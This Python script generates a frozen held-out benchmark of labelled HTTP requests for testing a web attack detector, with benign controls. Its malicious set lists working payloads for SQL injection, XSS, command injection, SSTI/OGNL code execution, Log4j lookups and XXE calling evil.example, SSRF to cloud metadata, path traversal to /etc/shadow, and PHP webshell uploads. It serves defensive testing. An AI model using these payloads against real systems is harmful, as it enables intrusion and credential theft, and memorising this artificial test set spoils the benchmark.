#!/usr/bin/env python3
"""Generate heldout_v3 corpus: fresh attack payloads (techniques NOT used in
heldout_v1/v2 tuning), two deliberately uncovered categories for honest
generalisation, and a diverse benign control set.

IMPORTANT: this corpus is FROZEN once written. Do not tune against it.
"""
import json, hashlib, itertools, random

random.seed(20260214)
OUT = "benchmarks/real_comparative/corpus/heldout_v3.jsonl"

ATTACKS = {
 "sql_injection": [
  ("GET","/search","q=test'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--",""),
  ("GET","/item","id=5||(SELECT(0)FROM(SELECT(SLEEP(3)))a)",""),
  ("GET","/user","name=x' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--",""),
  ("POST","/login","",'{"u":"admin","p":"x\' OR 1=1 LIMIT 1-- -"}'),
  ("GET","/order","sort=CASE WHEN (1=1) THEN name ELSE price END",""),
  ("GET","/export","fmt=xml' UNION SELECT table_name FROM information_schema.tables--",""),
  ("GET","/report","y=2024' AND JSON_EXTRACT(data,'$.admin')=true--",""),
  ("GET","/search","q='; WAITFOR DELAY '0:0:5'--",""),
  ("GET","/api","filter=1' HAVING 1=1--",""),
  ("GET","/item","id=(SELECT COUNT(*) FROM users)>0",""),
  ("POST","/graphql","",'{"query":"{ users(where:{email:{_eq:\\"x\' OR 1=1--\\"}}) { id } }"}'),
 ],
 "xss": [
  ("GET","/search","q=<img src=x onerror=alert(document.domain)>",""),
  ("GET","/c","msg=%22%3E%3Csvg%20onload%3Dalert(1)%3E",""),
  ("GET","/go","u=javascript%3Aalert%28document.cookie%29",""),
  ("GET","/page","t=<details open ontoggle=alert(1)>",""),
  ("GET","/f","x=<iframe src=javascript:alert(1)>",""),
  ("POST","/comment","",'{"text":"<noscript><p title=\\"</noscript><img src=x onerror=alert(1)>\\">"}'),
  ("GET","/s","q=%3Cscript%3Efetch(%27//evil%27)%3C/script%3E",""),
  ("GET","/profile","bio=<svg><script>alert(1)</script></svg>",""),
 ],
 "path_traversal": [
  ("GET","/static","f=....//....//etc/passwd",""),
  ("GET","/dl","file=..%c0%af..%c0%afetc%2fpasswd",""),
  ("GET","/view","p=/var/www/html/../../../../etc/shadow",""),
  ("GET","/asset","path=C:%5cWindows%5cwin.ini",""),
  ("GET","/read","f=file:///etc/passwd",""),
  ("GET","/img","src=php://filter/convert.base64-encode/resource=index.php",""),
  ("POST","/upload","",'{"name":"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"}'),
  ("GET","/doc","doc=....//....//proc/self/environ",""),
 ],
 "command_injection": [
  ("GET","/ping","host=127.0.0.1;id",""),
  ("GET","/ns","d=example.com|base64${IFS}-d${IFS}/tmp/x|sh",""),
  ("GET","/tool","cmd=ls${IFS}-la${IFS}/root",""),
  ("GET","/exec","a=1%0awhoami",""),
  ("POST","/api","",'{"ip":"8.8.8.8 & net user administrator"}'),
  ("GET","/p","x=$(id)",""),
  ("GET","/p","x=`whoami`",""),
  ("GET","/p","x=;cat${IFS}/etc/passwd",""),
  ("GET","/p","x=|powershell${IFS}-nop${IFS}-w${IFS}hidden${IFS}-enc${IFS}SQBFAFgA",""),
 ],
 "rce": [
  ("GET","/eval","code=assert($_GET['c'])",""),
  ("GET","/run","e=system('id')",""),
  ("POST","/api","",'{"fn":"Runtime.getRuntime().exec(\\"id\\")"}'),
  ("GET","/x",'y=${T(java.lang.Runtime).getRuntime().exec(\\"id\\")}',''),
  ("GET","/x",'y=%{(#cmd=\\"id\\").(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}',''),
  ("GET","/calc","expr=7*7",""),
 ],
 "ssti": [
  ("GET","/render","t={{config.items()}}",""),
  ("GET","/render","t={{lipsum.__globals__.__builtins__.open('/etc/passwd').read()}}",""),
  ("GET","/mail",'subject=<#assign x=\\"freemarker.template.utility.Execute\\"?new()>${x(\\"id\\")}',""),
  ("GET","/page",'v=#set($e=\\"exp\\")#evaluate($e)',""),
  ("POST","/tpl","",'{"tpl":"<%= system(\\"id\\") %>"}'),
  ("GET","/tpl","t={{['id']|map('system')|join}}",""),
 ],
 "nosql_injection": [
  ("POST","/login","",'{"username":"admin","password":{"$gt":""}}'),
  ("POST","/login","",'{"user":{"$regex":"^a"},"pass":{"$exists":true}}'),
  ("GET","/api","user[$ne]=1&pass[$ne]=1",""),
  ("POST","/api","",'{"$where":"this.username==\\"admin\\" && this.password.length>0"}'),
  ("POST","/api","",'{"filter":{"$expr":{"$gt":["$age",30]}}}'),
  ("GET","/search","q[$regex]=.*",""),
 ],
 "http_response_splitting": [
  ("GET","/redir","next=/%0d%0aLocation:%20https://evil.example/",""),
  ("GET","/redir","to=%250d%250aSet-Cookie:%20admin=1",""),
  ("GET","/r","url=/ok%0a%0dContent-Length:%200%0a%0d%0aHTTP/1.1%20200%20OK",""),
  ("POST","/api","",'{"redirect":"/home\\r\\nX-Powered-By:%20evil"}'),
 ],
 "ssrf": [
  ("GET","/fetch","url=http://2130706433/",""),
  ("GET","/fetch","url=http://0x7f000001/",""),
  ("GET","/fetch","url=http://127.1/",""),
  ("GET","/fetch","url=http://[::ffff:127.0.0.1]/",""),
  ("GET","/fetch","url=http://localtest.me/",""),
  ("GET","/fetch","url=http://169.254.169.254/latest/meta-data/",""),
  ("GET","/fetch","url=http://metadata.google.internal/computeMetadata/v1/",""),
  ("GET","/fetch","url=gopher://127.0.0.1:6379/_INFO",""),
  ("GET","/fetch","url=http://evil.example.com@127.0.0.1/",""),
  ("GET","/proxy","target=//127.0.0.1:8080/admin",""),
 ],
 "xxe": [
  ("POST","/xml","",'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'),
  ("POST","/xml","",'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "http://evil.example/x.dtd">%a;]><r/>'),
  ("POST","/xml","",'<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://evil.example/evil.dtd"><r/>'),
  ("POST","/api","",'{"doc":"<?xml version=\\"1.0\\"?><!DOCTYPE x [<!ENTITY e SYSTEM \\"expect://id\\">]><x>&e;</x>"}'),
 ],
 "jwt": [
  ("GET","/api","token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",""),
  ("GET","/api","token=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxIn0.c2ln",""),
  ("GET","/api","token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5leGFtcGxlL2tleXMuanNvbiJ9.eyJzdWIiOiIxIn0.c2ln",""),
  ("GET","/api","token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImFsZyI6Ik5PTkUifQ.eyJzdWIiOiJhZG1pbiJ9.",""),
 ],
 "framework_exploit": [
  ("GET","/search","q=${jndi:ldap://evil.example/a}",""),
  ("GET","/search","q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/a}",""),
  ("GET","/search","q=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}",""),
  ("POST","/api","",'{"class.module.classLoader.resources.context.parent.pipeline.first.pattern":"%25%7Bc2%7Di"}'),
  ("GET","/struts",'id=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd=\\"id\\").(#iswin=(@java.lang.System@getProperty(\\"os.name\\").toLowerCase().contains(\\"win\\"))).(#cmds=(#iswin?{\\"cmd.exe\\",\\"/c\\",#cmd}:{\\"/bin/bash\\",\\"-c\\",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',''),
  ("GET","/confluence","q={{7*7}}",""),
 ],
 "host_header_injection": [
  ("GET","/","", "", {"Host":"127.0.0.1:9200"}),
  ("GET","/","", "", {"X-Forwarded-Host":"evil.example"}),
  ("GET","/","", "", {"X-Host":"internal.local"}),
  ("GET","/","", "", {"Forwarded":"host=evil.example;proto=https"}),
  ("GET","http://evil.example/admin","", "", {}),
 ],
 "malicious_upload": [
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.php5"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["c"]);?>\r\n--x--'),
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="x.pht"\r\n\r\nGIF89a<?php echo `id`;?>\r\n--x--'),
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.php%00.jpg"\r\n\r\n<?php system("id");?>\r\n--x--'),
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename=".htaccess"\r\n\r\nAddType application/x-httpd-php .jpg\r\n--x--'),
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="logo.svg"\r\nContent-Type: image/svg+xml\r\n\r\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>\r\n--x--'),
 ],
 "sensitive_exposure": [
  ("GET","/.git/config","","",{}),
  ("GET","/.env","","",{}),
  ("GET","/actuator/env","","",{}),
  ("GET","/actuator/heapdump","","",{}),
  ("GET","/.svn/entries","","",{}),
  ("GET","/.ssh/id_rsa","","",{}),
  ("GET","/backup.sql","","",{}),
  ("GET","/wp-config.php~","","",{}),
  ("GET","/elmah.axd","","",{}),
  ("GET","/.npmrc","","",{}),
 ],
 "cms_wordpress": [
  ("GET","/wp-json/wp/v2/users","","",{}),
  ("GET","/","?author=1","",{}),
  ("GET","/","?rest_route=/wp/v2/users","",{}),
  ("POST","/wp-login.php","","log=admin&pwd=admin123&wp-submit=Log+In",{}),
  ("POST","/xmlrpc.php","",'<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>x</string></value></param></params></methodCall>',{}),
  ("GET","/wp-content/debug.log","","",{}),
  ("GET","/wp-content/plugins/akismet/readme.txt","","",{}),
  ("GET","/wp-admin/install.php?step=2","","",{}),
 ],
 # Deliberately uncovered categories: honest generalisation check.
 "ldap_injection": [
  ("POST","/login","",'{"user":"*)(uid=*))(|(uid=*","pass":"x"}'),
  ("GET","/auth","u=admin)(|(password=*))",""),
  ("POST","/api","",'{"filter":"*)(objectClass=*"}'),
  ("GET","/dir","cn=*)(|(cn=*",""),
 ],
 "deserialization": [
  ("POST","/api","",'{"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH"}'),
  ("POST","/import","",'O:8:"stdClass":1:{s:4:"exec";s:2:"id";}'),
  ("GET","/view","data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",""),
  ("POST","/api","",'{"viewState":"/wEPDwUKLTY0NTU4NzkxNGRk..."}'),
 ],
}

BENIGN = [
 # Normal API traffic
 ("POST","/api/login","",'{"email":"ana@tienda.cl","password":"Tr0p1c@l!2026"}'),
 ("GET","/api/v1/users/123/posts","",""),
 ("POST","/api/comments","",'{"post":42,"text":"Excelente articulo, gracias!"}'),
 ("GET","/api/search","q=cafe+con+leche",""),
 ("GET","/api/search","q=%22caf%C3%A9%22",""),
 ("POST","/api/orders","",'{"items":[{"sku":"A1","qty":2}],"note":"entregar en recepcion"}'),
 # Text with tricky-but-benign characters
 ("POST","/api/contact","",'{"msg":"Uso 1;2 como separador y 50% de descuento"}'),
 ("GET","/api/tips","t=C%2B%2B+rocks",""),
 ("POST","/api/bio","",'{"bio":"Me gusta <3 programar y leer libros"}'),
 ("GET","/api/math","expr=2*(3+4)",""),
 ("POST","/api/story","",'{"text":"Dijo: \\"hola\\" y sonrio :)"}'),
 ("GET","/api/q","q=O%27Brien",""),
 ("GET","/api/q","q=price+%3E+100",""),
 ("GET","/api/q","q=50%25+off",""),
 # URLs and redirects that are legit
 ("GET","/go","next=https%3A%2F%2Fexample.com%2Fdocs",""),
 ("GET","/proxy","url=https%3A%2F%2Fcdn.example.com%2Fimg.png",""),
 ("GET","/img","src=https%3A%2F%2Fimages.example.com%2Fa.jpg",""),
 ("POST","/api/hooks","",'{"callback_url":"https://hooks.example.com/notify"}'),
 # Uploads legitimos
 ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="informe.pdf"\r\nContent-Type: application/pdf\r\n\r\n%PDF-1.4 fake\r\n--x--'),
 ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="foto.jpg"\r\nContent-Type: image/jpeg\r\n\r\n\xff\xd8\xff\xe0jpeg\r\n--x--'),
 ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="doc.docx"\r\n\r\nPK\x03\x04zip\r\n--x--'),
 # Data URIs benignos (incluye el caso SVG-CSS que era FP)
 ("POST","/estilos","",'regla=background-image:url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'10\'></svg>")'),
 ("POST","/api","",'{"icon":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="}'),
 # JSON con $ benigno
 ("POST","/api/config","",'{"$schema":"https://json-schema.org/draft/2020-12/schema","type":"object"}'),
 ("POST","/api/ref","",'{"$ref":"#/definitions/User","name":"Ana"}'),
 # WordPress legitimo
 ("GET","/wp-json/wp/v2/posts","?per_page=10&_fields=title,link",""),
 ("POST","/wp-admin/admin-ajax.php","",'action=heartbeat&interval=15&data=%7B%22common%22%3A%7B%22last%22%3A1730000000%7D%7D'),
 ("GET","/wp-json/wp/v2/categories","",""),
 ("GET","/xmlrpc.php","?rsd",""),
 # GraphQL benigno
 ("POST","/graphql","",'{"query":"{ user(id: 1) { name email } }"}'),
 ("POST","/graphql","",'{"query":"query GetPosts($first: Int!) { posts(first: $first) { nodes { title } } }","variables":{"first":5}}'),
 # Headers normales
 ("GET","/","","",{"Host":"api.example.com","X-Forwarded-Proto":"https","User-Agent":"Mozilla/5.0"}),
 ("GET","/","","",{"X-Forwarded-For":"203.0.113.10","X-Real-IP":"203.0.113.10"}),
 ("GET","/","","",{"Forwarded":"for=203.0.113.10;proto=https;host=api.example.com"}),
 # JWT legitimo (HS256 con firma)
 ("GET","/api/me","token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiQW5hIiwiaWF0IjoxNzAwMDAwMDAwfQ.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk",""),
 # Passwords con simbolos
 ("POST","/api/login","",'{"user":"admin","pass":"P@ssw0rd!#$%^&*()"}'),
 ("POST","/api/login","",'{"user":"root","pass":";DROP TABLE--"}'),  # password literal, no contexto SQL
 # Paths normales con palabras sensibles
 ("GET","/api/files/etc-notes","",""),
 ("GET","/docs/setup","s=install+on+windows+10",""),
 ("GET","/api/v2/status","",""),
 # Unicode / emoji / idiomas
 ("POST","/api/msg","",'{"text":"Hola mundo! 🌍 Привет こんにちは"}'),
 ("GET","/api/search","q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82",""),
 # Base64 blobs benignos
 ("POST","/api/import","",'{"csv":"bmFtZSxlbWFpbApBbmEsYW5hQGV4YW1wbGUuY29tCg=="}'),
 # JSONP / callbacks
 ("GET","/api/data","callback=handleResponse&format=jsonp",""),
 # Markdown / rich text
 ("POST","/api/page","",'{"body":"# Titulo\\n\\n**negrita** y [link](https://example.com)"}'),
 # SQL benigno en strings de config
 ("POST","/api/query-builder","",'{"fields":["id","name"],"where":{"status":"active"},"limit":10}'),
 ("GET","/api/export","format=csv&fields=id,name,date",""),
]

# Expand benign set to ~120 with parameter permutations
extra = []
params_pool = [
 ("GET","/api/search","q={v}",""),
 ("GET","/items","filter={v}",""),
 ("POST","/api/data","",'{"value":"{v}"}'),
]
vals = ["hola","test","admin","123","a b c","x=y","a&b","100%","#tag","@user",
        "café","naïve","hello-world","v1.2.3","file.txt","/tmp/x","C:\\temp",
        "true","false","null","{json}","[1,2]","a+b","a%20b","semi;colon",
        "pipe|char","dollar$sign","back`tick","paren(test)","brack[et]",
        "star*wild","quest?ion","lt<gt>","quot\"es","apos'x","tilde~user"]
for (m,p,q,b),(fmt) in itertools.product(params_pool, vals):
    extra.append((m,p,q.replace("{v}",fmt) if "{v}" in q else q,b.replace("{v}",fmt) if "{v}" in b else b))
BENIGN += extra[:60]

def mk(case_id, cat, label, note, method, path, query, body, headers=None, split="held_out", split_reason=None):
    return {
        "case_id": case_id, "category": cat, "corpus": "heldout_v3",
        "corpus_sha256": None, "corpus_version": None,
        "label": label, "note": note,
        "request": {"body": body, "headers": headers or {}, "method": method,
                    "path": path, "query": query},
        "split": split,
        "split_reason": split_reason or ("Frozen held-out batch v3: techniques not used in v1/v2 tuning." if label=="malicious" else "Benign control written independently of engine internals."),
    }

cases = []
notes = {
 "sql_injection":"Comment-obfuscated UNION, subquery sleep, CASE sort, JSON_EXTRACT, HAVING.",
 "xss":"Event handlers, svg/details/noscript vectors, javascript: URIs, encoded script.",
 "path_traversal":"....// bypass, overlong UTF-8, absolute system paths, file://, php://filter.",
 "command_injection":"IFS substitution, newline, $()/backticks, Windows net user, powershell -enc.",
 "rce":"eval/system sinks, SpEL, OGNL, Thymeleaf preprocessor.",
 "ssti":"Jinja globals, Freemarker Execute, Velocity evaluate, ERB, Twig filters.",
 "nosql_injection":"$gt/$ne/$regex/$where/$expr operators in JSON and bracket form.",
 "http_response_splitting":"CRLF and double-encoded CRLF header injection via redirect params.",
 "ssrf":"Decimal/hex/short loopback, IPv6-mapped, rebinding domains, metadata, gopher, userinfo trick.",
 "xxe":"External entities, parameter entities, external DTD, expect:// wrapper.",
 "jwt":"alg:none variants, kid traversal, jku SSRF, duplicate alg header.",
 "framework_exploit":"Log4j JNDI with lower/::- obfuscation, Spring4Shell, Struts2 OGNL, Confluence.",
 "host_header_injection":"Host/X-Forwarded-Host/X-Host/Forwarded header abuse, absolute URI.",
 "malicious_upload":"Executable extensions (.php5/.pht), null byte, .htaccess, svg+script polyglot.",
 "sensitive_exposure":".git/.env/actuator/.svn/.ssh/backup/elmah probes.",
 "cms_wordpress":"REST user enumeration, author scan, xmlrpc, wp-login, debug.log, plugin readme.",
 "ldap_injection":"LDAP filter metacharacters in auth params (UNCOVERED category).",
 "deserialization":"Java/PHP serialized object markers (UNCOVERED category).",
}
for cat, payloads in ATTACKS.items():
    for i,(m,p,q,b,*rest) in enumerate(payloads):
        headers = rest[0] if rest else {}
        cases.append(mk(f"heldout_v3/{cat}-{i:02d}", cat, "malicious", notes[cat], m, p, q, b, headers))
for i,(m,p,q,b,*rest) in enumerate(BENIGN):
    headers = rest[0] if rest else {}
    cases.append(mk(f"heldout_v3/benign-{i:03d}", "benign", "benign", "Benign control v3.", m, p, q, b, headers))

with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in cases:
        f.write(json.dumps(c,ensure_ascii=False)+"\n")
body = open(OUT,"rb").read()
sha = hashlib.sha256(body).hexdigest()
# embed sha
lines=[json.loads(l) for l in open(OUT,encoding="utf-8")]
for c in lines: c["corpus_sha256"]=sha
with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in lines: f.write(json.dumps(c,ensure_ascii=False)+"\n")
mal=[c for c in cases if c["label"]=="malicious"]
ben=[c for c in cases if c["label"]=="benign"]
print(f"wrote {len(cases)} cases -> {OUT}")
print(f"malicious={len(mal)} benign={len(ben)} sha256={sha[:16]}")
from collections import Counter
print(Counter(c["category"] for c in mal))
